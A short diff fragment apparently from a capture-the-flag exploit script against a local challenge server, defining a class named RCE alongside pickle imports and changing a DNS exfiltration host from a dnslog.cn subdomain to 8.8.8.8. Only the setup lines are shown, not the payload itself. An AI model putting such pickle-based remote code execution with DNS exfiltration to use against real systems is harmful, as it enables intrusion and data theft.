@@ -2,7 +2,7 @@ import pickle, os, requests, time
 
 HOST, PORT = "127.0.0.1", 1337
 CHALLENGE_URL = f"http://{HOST}:{PORT}"
-DNS_EXFIL = "476bdo.dnslog.cn"
+DNS_EXFIL = "8.8.8.8"
 
 class RCE:
     def __init__(self, char):
